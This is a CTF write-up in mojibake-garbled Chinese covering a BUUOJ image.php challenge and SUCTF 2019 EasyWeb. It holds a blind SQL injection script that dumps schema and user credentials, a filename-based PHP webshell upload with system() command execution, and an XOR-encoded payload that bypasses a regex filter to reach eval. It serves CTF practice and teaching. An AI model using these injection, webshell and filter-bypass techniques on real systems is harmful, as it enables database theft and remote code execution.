<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span> <span class="hljs-string">&quot;config.php&quot;</span>;<br><br><span class="hljs-variable">$id</span>=<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;id&quot;</span>])?<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;id&quot;</span>]:<span class="hljs-string">&quot;1&quot;</span>;<br><span class="hljs-variable">$path</span>=<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;path&quot;</span>])?<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;path&quot;</span>]:<span class="hljs-string">&quot;&quot;</span>;<br><br><span class="hljs-variable">$id</span>=<span class="hljs-title function_ invoke__">addslashes</span>(<span class="hljs-variable">$id</span>);<br><span class="hljs-variable">$path</span>=<span class="hljs-title function_ invoke__">addslashes</span>(<span class="hljs-variable">$path</span>);<br><br><span class="hljs-variable">$id</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;\\0&quot;</span>,<span class="hljs-string">&quot;%00&quot;</span>,<span class="hljs-string">&quot;\\&#x27;&quot;</span>,<span class="hljs-string">&quot;&#x27;&quot;</span>),<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$id</span>);<br><span class="hljs-variable">$path</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;\\0&quot;</span>,<span class="hljs-string">&quot;%00&quot;</span>,<span class="hljs-string">&quot;\\&#x27;&quot;</span>,<span class="hljs-string">&quot;&#x27;&quot;</span>),<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$path</span>);<br><br><span class="hljs-variable">$result</span>=<span class="hljs-title function_ invoke__">mysqli_query</span>(<span class="hljs-variable">$con</span>,<span class="hljs-string">&quot;select * from images where id=&#x27;<span class="hljs-subst">&#123;$id&#125;</span>&#x27; or path=&#x27;<span class="hljs-subst">&#123;$path&#125;</span>&#x27;&quot;</span>);<br><span class="hljs-variable">$row</span>=<span class="hljs-title function_ invoke__">mysqli_fetch_array</span>(<span class="hljs-variable">$result</span>,MYSQLI_ASSOC);<br><br><span class="hljs-variable">$path</span>=<span class="hljs-string">&quot;./&quot;</span> . <span class="hljs-variable">$row</span>[<span class="hljs-string">&quot;path&quot;</span>];<br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Content-Type: image/jpeg&quot;</span>);<br><span class="hljs-title function_ invoke__">readfile</span>(<span class="hljs-variable">$path</span>);<br><br></code></pre></td></tr></table></figure>

<p><strong>addslashes()å‡½æ•°</strong></p>
<p><img src="/images/X0TJURPAN5C4V2T1B.png" srcset="/img/loading.gif" lazyload></p>
<p>str_replaceå°†\0,%00,\â€˜,â€â€˜â€œæ›¿æ¢æˆç©º(å‰é¢ç¬¬ä¸€ä¸ª\æ˜¯ç”¨æ¥è½¬ä¹‰çš„ï¼Œä½¿å…¶ä¸è¢«è§£é‡Šä¸ºå…¶åŸå§‹å«ä¹‰ï¼Œè€Œæ˜¯ä½œä¸ºæ™®é€šå­—ç¬¦å¤„ç†)ã€‚</p>
<p>å› ä¸ºè¦SQLæ³¨å…¥ï¼Œæ‰€ä»¥è¦ç ´å¼€å¼•å·ï¼Œä½†æ˜¯å¼•å·è¢«è½¬ä¹‰ã€‚è‹¥æ˜¯å½“æˆ‘è¾“å…¥â€?id&#x3D;\0â€,ç»è¿‡addslashes()â€“&gt;â€?id&#x3D;\0â€å†ç»è¿‡str_replaceâ€“&gt;â€?id&#x3D;&quot;,SQLè¯­å¥å°±å˜ä¸º</p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> images <span class="hljs-keyword">where</span> id=<span class="hljs-string">&#x27;\&#x27;</span> <span class="hljs-keyword">or</span> <span class="hljs-type">path</span>=<span class="hljs-string">&#x27;&#123;$path&#125;&#x27;</span><br></code></pre></td></tr></table></figure>

<p>è¿™æ ·ç”±äº\å³è¾¹çš„å•å¼•å·è¢«è½¬ä¹‰,å¯¼è‡´åŸæœ‰çš„SQLè¯­å¥å¼•å·é—­åˆå‘ç”Ÿé”™è¯¯ã€‚å®é™…ä¸Šid&#x3D;&#39; or path&#x3D;ã€‚ç°åœ¨æˆ‘ä»¬å¯ä»¥å¯¹pathè¿›è¡Œsqlæ³¨å…¥</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">id</span>=\0&amp;path=or <span class="hljs-attribute">1</span>=1#<br><br>select * <span class="hljs-keyword">from</span> images where <span class="hljs-attribute">id</span>=<span class="hljs-string">&#x27;\&#x27;</span> <span class="hljs-keyword">or</span> <span class="hljs-attribute">path</span>=<span class="hljs-string">&#x27;or 1=1%23&#x27;</span><br></code></pre></td></tr></table></figure>
<p>ç¡®å®šäº†SQLæ³¨å…¥çš„å§¿åŠ¿ï¼Œå†™å¥½è„šæœ¬</p>
<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">import requests<br><br>url = <span class="hljs-string">&quot;http://db4624a1-f8f4-48f5-8a2c-1936066abc00.node5.buuoj.cn:81/image.php&quot;</span><br><span class="hljs-built_in">result</span> = <span class="hljs-string">&#x27;&#x27;</span><br>i = <span class="hljs-number">0</span><br><span class="hljs-keyword">while</span> <span class="hljs-number">1</span>:<br>    i = i + <span class="hljs-number">1</span><br>    low = <span class="hljs-number">32</span><br>    high = <span class="hljs-number">127</span><br>    <span class="hljs-keyword">while</span> low &lt; high:<br>        <span class="hljs-keyword">mid</span> = (low + high)<span class="hljs-comment"> // 2</span><br>        payload = f<span class="hljs-string">&#x27;?id=\\0&amp;path=or if(ascii(substr((select group_concat(schema_name) from information_schema.schemata),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,0)%23&#x27;</span><br>        <span class="hljs-comment"># payload = f&#x27;?id=\\0&amp;path=or if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=0x636973636e66696e616c),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,0)%23&#x27;</span><br>        <span class="hljs-comment"># payload = f&#x27;?id=\\0&amp;path=or if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=0x7573657273),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,0)%23&#x27;</span><br>        <span class="hljs-comment"># payload = f&#x27;?id=\\0&amp;path=or if(ascii(substr((select group_concat(username,0x7e,password) from ciscnfinal.users),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,0)%23&#x27;</span><br><br>        r = requests.<span class="hljs-built_in">get</span>(url=url + payload)<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;JFIF&#x27;</span> <span class="hljs-keyword">in</span> r.<span class="hljs-keyword">text</span>:<br>            low = <span class="hljs-keyword">mid</span> + <span class="hljs-number">1</span><br>            <span class="hljs-comment"># time.sleep(0.1)</span><br>        <span class="hljs-keyword">else</span>:<br>            high = <span class="hljs-keyword">mid</span><br>    <span class="hljs-keyword">if</span> low != <span class="hljs-number">32</span>:<br>        <span class="hljs-built_in">result</span> += chr(low)<br>        print(<span class="hljs-built_in">result</span>)<br>    <span class="hljs-keyword">else</span>:<br>        break<br><br><br></code></pre></td></tr></table></figure>
<p><img src="/images/N9CGYYCEP3EZQDEJ68.png" srcset="/img/loading.gif" lazyload><br>çˆ†å‡ºè´¦å·å¯†ç <br><img src="/images/GCXTCVGQWGKY2051IB.png" srcset="/img/loading.gif" lazyload><br>ç™»å½•åè·³è½¬åˆ°ä¸€ä¸ªæ–°çš„é¡µé¢<br>æ–‡ä»¶ä¸Šä¼ ï¼Œè¯•ä¸‹æ–‡ä»¶ä¸Šä¼ çš„æ¼æ´<br>å…ˆéšä¾¿ä¸Šä¼ ä¸€ä¸ªæ–‡ä»¶<br><img src="/images/V4ITWGNOKYAMX8T43AAI.png" srcset="/img/loading.gif" lazyload><br>æ‰¾åˆ°ä¸Šä¼ è·¯å¾„<br><img src="/images/UC7SUGRR0YF9MOJA.png" srcset="/img/loading.gif" lazyload><br>è¿›å…¥è·¯å¾„å‘ç°ä¼šå°†æ–‡ä»¶åå†™è¿›æ—¥å¿—ï¼Œè€Œä¸”æ—¥å¿—è¿˜æ˜¯phpæ–‡ä»¶<br>æŠŠæ–‡ä»¶åå†™ä¸ºä¸€å¥è¯æœ¨é©¬<br><img src="/images/EGJS4BX55M1QSF1L0Z.png" srcset="/img/loading.gif" lazyload><br><img src="/images/98BULSOGXEVGOMI0.png" srcset="/img/loading.gif" lazyload><br>ä¸èƒ½ä¸Šä¼ phpæ–‡ä»¶<br>æˆ‘ä»¬æ”¹ä¸€ä¸‹ä¸€å¥è¯æœ¨é©¬<br><img src="/images/T8SO83LCB9T9Q.png" srcset="/img/loading.gif" lazyload><br>æˆåŠŸä¸Šä¼ <br><img src="/images/4UYQN5DH5PEUE16EQVHR.png" srcset="/img/loading.gif" lazyload><br>çœ‹æ ·å­phpè¯­å¥å†™è¿›å»äº†<br>ç›´æ¥å‘½ä»¤æ‰§è¡Œ</p>
<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">a</span>=system(<span class="hljs-string">&#x27;ls&#x27;</span>)<span class="hljs-comment">;</span><br><span class="hljs-attr">a</span>=system(<span class="hljs-string">&#x27;ls /&#x27;</span>)<span class="hljs-comment">;</span><br><span class="hljs-attr">a</span>=system(<span class="hljs-string">&#x27;cat /flag&#x27;</span>)<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure>
<p>è¿™é‡Œæœ‰å¤§ä½¬ç”¨å…¶å®ƒæ–¹æ³•åšçš„ï¼Œç›´æ¥ç®—å‡ºadminçš„cookieğŸ¥¶<br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/wkzb/p/12562379.html">ä¼ é€é—¨</a></p>
<h2 id="SUCTF-2019-EasyWeb"><a href="#SUCTF-2019-EasyWeb" class="headerlink" title="[SUCTF 2019]EasyWeb"></a>[SUCTF 2019]EasyWeb</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_the_flag</span>(<span class="hljs-params"></span>)</span>&#123;<br>    <span class="hljs-comment">// webadmin will remove your upload file every 20 min!!!! </span><br>    <span class="hljs-variable">$userdir</span> = <span class="hljs-string">&quot;upload/tmp_&quot;</span>.<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REMOTE_ADDR&#x27;</span>]);<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-variable">$userdir</span>))&#123;<br>    <span class="hljs-title function_ invoke__">mkdir</span>(<span class="hljs-variable">$userdir</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>]))&#123;<br>        <span class="hljs-variable">$tmp_name</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;tmp_name&quot;</span>];<br>        <span class="hljs-variable">$name</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;name&quot;</span>];<br>        <span class="hljs-variable">$extension</span> = <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$name</span>, <span class="hljs-title function_ invoke__">strrpos</span>(<span class="hljs-variable">$name</span>,<span class="hljs-string">&quot;.&quot;</span>)+<span class="hljs-number">1</span>);<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/ph/i&quot;</span>,<span class="hljs-variable">$extension</span>)) <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;^_^&quot;</span>); <br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">mb_strpos</span>(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$tmp_name</span>), <span class="hljs-string">&#x27;&lt;?&#x27;</span>)!==False) <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;^_^&quot;</span>);<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">exif_imagetype</span>(<span class="hljs-variable">$tmp_name</span>)) <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;^_^&quot;</span>); <br>        <span class="hljs-variable">$path</span>= <span class="hljs-variable">$userdir</span>.<span class="hljs-string">&quot;/&quot;</span>.<span class="hljs-variable">$name</span>;<br>        @<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$tmp_name</span>, <span class="hljs-variable">$path</span>);<br>        <span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-variable">$path</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$hhh</span> = @<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;_&#x27;</span>];<br><br><span class="hljs-keyword">if</span> (!<span class="hljs-variable">$hhh</span>)&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$hhh</span>)&gt;<span class="hljs-number">18</span>)&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;One inch long, one inch strong!&#x27;</span>);<br>&#125;<br><br><span class="hljs-keyword">if</span> ( <span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/[\x00- 0-9A-Za-z\&#x27;&quot;\`~_&amp;.,|=[\x7F]+/i&#x27;</span>, <span class="hljs-variable">$hhh</span>) )<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Try something else!&#x27;</span>);<br><br><span class="hljs-variable">$character_type</span> = <span class="hljs-title function_ invoke__">count_chars</span>(<span class="hljs-variable">$hhh</span>, <span class="hljs-number">3</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$character_type</span>)&gt;<span class="hljs-number">12</span>) <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Almost there!&quot;</span>);<br><br><span class="hljs-keyword">eval</span>(<span class="hljs-variable">$hhh</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>å…ˆä¸çœ‹è¿™ä¸ªå‡½æ•°ï¼Œæˆ‘ä»¬è¦ç»•è¿‡è¿™ä¸ªæ­£åˆ™è¡¨è¾¾å¼ï¼Œä¸”ä¸èƒ½è¶…è¿‡18ä¸ªå­—èŠ‚ï¼Œé‚£ä¹ˆå¯ä»¥ä½¿ç”¨å¼‚æˆ–æˆ–è€…å–åï¼Œåœ¨è¿™é¢˜é‡Œå–åç¬¦~è¢«è¿‡æ»¤äº†ï¼Œæ‰€ä»¥æˆ‘ä»¬ç”¨å¼‚æˆ–ï¼Œè¿™é‡Œæåˆ°å¤§ä½¬å†™çš„è„šæœ¬<br>å¼‚æˆ–è„šæœ¬</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">finds</span>(<span class="hljs-params"><span class="hljs-variable">$string</span></span>)</span>&#123;<br>	<span class="hljs-variable">$index</span> = <span class="hljs-number">0</span>;<br>	<span class="hljs-variable">$a</span>=[<span class="hljs-number">33</span>,<span class="hljs-number">35</span>,<span class="hljs-number">36</span>,<span class="hljs-number">37</span>,<span class="hljs-number">40</span>,<span class="hljs-number">41</span>,<span class="hljs-number">42</span>,<span class="hljs-number">43</span>,<span class="hljs-number">45</span>,<span class="hljs-number">47</span>,<span class="hljs-number">58</span>,<span class="hljs-number">59</span>,<span class="hljs-number">60</span>,<span class="hljs-number">62</span>,<span class="hljs-number">63</span>,<span class="hljs-number">64</span>,<span class="hljs-number">92</span>,<span class="hljs-number">93</span>,<span class="hljs-number">94</span>,<span class="hljs-number">123</span>,<span class="hljs-number">125</span>,<span class="hljs-number">128</span>,<span class="hljs-number">129</span>,<span class="hljs-number">130</span>,<span class="hljs-number">131</span>,<span class="hljs-number">132</span>,<span class="hljs-number">133</span>,<span class="hljs-number">134</span>,<span class="hljs-number">135</span>,<span class="hljs-number">136</span>,<span class="hljs-number">137</span>,<span class="hljs-number">138</span>,<span class="hljs-number">139</span>,<span class="hljs-number">140</span>,<span class="hljs-number">141</span>,<span class="hljs-number">142</span>,<span class="hljs-number">143</span>,<span class="hljs-number">144</span>,<span class="hljs-number">145</span>,<span class="hljs-number">146</span>,<span class="hljs-number">147</span>,<span class="hljs-number">148</span>,<span class="hljs-number">149</span>,<span class="hljs-number">150</span>,<span class="hljs-number">151</span>,<span class="hljs-number">152</span>,<span class="hljs-number">153</span>,<span class="hljs-number">154</span>,<span class="hljs-number">155</span>,<span class="hljs-number">156</span>,<span class="hljs-number">157</span>,<span class="hljs-number">158</span>,<span class="hljs-number">159</span>,<span class="hljs-number">160</span>,<span class="hljs-number">161</span>,<span class="hljs-number">162</span>,<span class="hljs-number">163</span>,<span class="hljs-number">164</span>,<span class="hljs-number">165</span>,<span class="hljs-number">166</span>,<span class="hljs-number">167</span>,<span class="hljs-number">168</span>,<span class="hljs-number">169</span>,<span class="hljs-number">170</span>,<span class="hljs-number">171</span>,<span class="hljs-number">172</span>,<span class="hljs-number">173</span>,<span class="hljs-number">174</span>,<span class="hljs-number">175</span>,<span class="hljs-number">176</span>,<span class="hljs-number">177</span>,<span class="hljs-number">178</span>,<span class="hljs-number">179</span>,<span class="hljs-number">180</span>,<span class="hljs-number">181</span>,<span class="hljs-number">182</span>,<span class="hljs-number">183</span>,<span class="hljs-number">184</span>,<span class="hljs-number">185</span>,<span class="hljs-number">186</span>,<span class="hljs-number">187</span>,<span class="hljs-number">188</span>,<span class="hljs-number">189</span>,<span class="hljs-number">190</span>,<span class="hljs-number">191</span>,<span class="hljs-number">192</span>,<span class="hljs-number">193</span>,<span class="hljs-number">194</span>,<span class="hljs-number">195</span>,<span class="hljs-number">196</span>,<span class="hljs-number">197</span>,<span class="hljs-number">198</span>,<span class="hljs-number">199</span>,<span class="hljs-number">200</span>,<span class="hljs-number">201</span>,<span class="hljs-number">202</span>,<span class="hljs-number">203</span>,<span class="hljs-number">204</span>,<span class="hljs-number">205</span>,<span class="hljs-number">206</span>,<span class="hljs-number">207</span>,<span class="hljs-number">208</span>,<span class="hljs-number">209</span>,<span class="hljs-number">210</span>,<span class="hljs-number">211</span>,<span class="hljs-number">212</span>,<span class="hljs-number">213</span>,<span class="hljs-number">214</span>,<span class="hljs-number">215</span>,<span class="hljs-number">216</span>,<span class="hljs-number">217</span>,<span class="hljs-number">218</span>,<span class="hljs-number">219</span>,<span class="hljs-number">220</span>,<span class="hljs-number">221</span>,<span class="hljs-number">222</span>,<span class="hljs-number">223</span>,<span class="hljs-number">224</span>,<span class="hljs-number">225</span>,<span class="hljs-number">226</span>,<span class="hljs-number">227</span>,<span class="hljs-number">228</span>,<span class="hljs-number">229</span>,<span class="hljs-number">230</span>,<span class="hljs-number">231</span>,<span class="hljs-number">232</span>,<span class="hljs-number">233</span>,<span class="hljs-number">234</span>,<span class="hljs-number">235</span>,<span class="hljs-number">236</span>,<span class="hljs-number">237</span>,<span class="hljs-number">238</span>,<span class="hljs-number">239</span>,<span class="hljs-number">240</span>,<span class="hljs-number">241</span>,<span class="hljs-number">242</span>,<span class="hljs-number">243</span>,<span class="hljs-number">244</span>,<span class="hljs-number">245</span>,<span class="hljs-number">246</span>,<span class="hljs-number">247</span>,<span class="hljs-number">248</span>,<span class="hljs-number">249</span>,<span class="hljs-number">250</span>,<span class="hljs-number">251</span>,<span class="hljs-number">252</span>,<span class="hljs-number">253</span>,<span class="hljs-number">254</span>,<span class="hljs-number">255</span>];<br>	<span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span>=<span class="hljs-number">27</span>;<span class="hljs-variable">$i</span>&lt;<span class="hljs-title function_ invoke__">count</span>(<span class="hljs-variable">$a</span>);<span class="hljs-variable">$i</span>++)&#123;<br>		<span class="hljs-keyword">for</span>(<span class="hljs-variable">$j</span>=<span class="hljs-number">27</span>;<span class="hljs-variable">$j</span>&lt;<span class="hljs-title function_ invoke__">count</span>(<span class="hljs-variable">$a</span>);<span class="hljs-variable">$j</span>++)&#123;<br>			<span class="hljs-variable">$x</span> = <span class="hljs-variable">$a</span>[<span class="hljs-variable">$i</span>] ^ <span class="hljs-variable">$a</span>[<span class="hljs-variable">$j</span>];<br>			<span class="hljs-keyword">for</span>(<span class="hljs-variable">$k</span> = <span class="hljs-number">0</span>;<span class="hljs-variable">$k</span>&lt;<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$string</span>);<span class="hljs-variable">$k</span>++)&#123;<br>				<span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$string</span>[<span class="hljs-variable">$k</span>]) == <span class="hljs-variable">$x</span>)&#123;<br>					<span class="hljs-keyword">echo</span> <span class="hljs-variable">$string</span>[<span class="hljs-variable">$k</span>].<span class="hljs-string">&quot;\n&quot;</span>;<br>					<span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;%&#x27;</span> . <span class="hljs-title function_ invoke__">dechex</span>(<span class="hljs-variable">$a</span>[<span class="hljs-variable">$i</span>]) . <span class="hljs-string">&#x27;^%&#x27;</span> . <span class="hljs-title function_ invoke__">dechex</span>(<span class="hljs-variable">$a</span>[<span class="hljs-variable">$j</span>]).<span class="hljs-string">&quot;\n&quot;</span>;<br>					<span class="hljs-variable">$index</span>++;<br>					<span class="hljs-keyword">if</span>(<span class="hljs-variable">$index</span> == <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$string</span>))&#123;<br>						<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>					&#125;<br>				&#125;<br>			&#125;<br>		&#125;<br>	&#125;<br>&#125;<br><span class="hljs-title function_ invoke__">finds</span>(<span class="hljs-string">&quot;_GET&quot;</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
<p><img src="/images/5BFCF02568634797A09551490EB4699D.png" srcset="/img/loading.gif" lazyload><br><strong>å…³äºå¼‚æˆ–ç»•è¿‡</strong></p>
<figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mel">phpçš„<span class="hljs-keyword">eval</span>()å‡½æ•°åœ¨æ‰§è¡Œæ—¶å¦‚æœå†…éƒ¨æœ‰ç±»ä¼¼<span class="hljs-string">&quot;abc&quot;</span>^<span class="hljs-string">&quot;def&quot;</span>çš„è®¡ç®—å¼ï¼Œé‚£ä¹ˆå°±å…ˆè¿›è¡Œè®¡ç®—å†æ‰§è¡Œã€‚ä¾‹å¦‚url?a=&#123;_GET&#125;&#123;b&#125;();&amp;b=phpinfo,ä¹Ÿå°±æ˜¯?a=$&#123;%ff%ff%ff%ff^%a0%b8%ba%ab&#125;&#123;%ff&#125;();&amp;%ff=phpinfo,åœ¨ä¼ å…¥åå®é™…ä¸Šä¸º$&#123;????^????&#125;&#123;?&#125;();ä½†æ˜¯åˆ°äº†<span class="hljs-keyword">eval</span>()å‡½æ•°å†…éƒ¨å°±ä¼šå˜æˆ$&#123;_GET&#125;&#123;?&#125;();æˆåŠŸæ‰§è¡Œã€‚<br></code></pre></td></tr></table></figure>
<p>è¯¦ç»†çœ‹<a target="_blank" rel="noopener" href="https://www.cnblogs.com/cimuhuashuimu/p/11546422.html">HanamizukièŠ±æ°´æœ¨phpå¼‚æˆ–è®¡ç®—ç»•è¿‡preg_match</a></p>
<p>æˆ‘ä»¬æ„é€ å‡ºpayload</p>
<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs perl">?<span class="hljs-number">_</span>=$&#123;%86%86%86%86^%d9%c1%c3%d2&#125;&#123;%86&#125;();&amp;%86=phpinfo<br>//ç›¸å½“äº$&#123;_GET&#125;&#123;%86&#125;(),è¿™é‡Œphpinfoçš„æ‹¬å·æ˜¯åœ¨å‰é¢<br></code></pre></td></tr></table></figure>

<h3 id="éé¢„æœŸè§£"><a href="#éé¢„æœŸè§£" class="headerlink" title="éé¢„æœŸè§£"></a>éé¢„æœŸè§£</h3><p><img src="/images/C44A42F58EDA4d0e8303A1F89CD6A7C8.png" srcset="/img/loading.gif" lazyload></p>
<h3 id="é¢„æœŸè§£"><a href="#é¢„æœŸè§£" class="headerlink" title="é¢„æœŸè§£"></a>é¢„æœŸè§£</h3><p>å…ˆçœ‹ä¸€ä¸‹disable_functionsï¼Œå‘ç°banäº†å¾ˆå¤šå‘½ä»¤æ‰§è¡Œå‡½æ•°systemã€execç­‰</p>
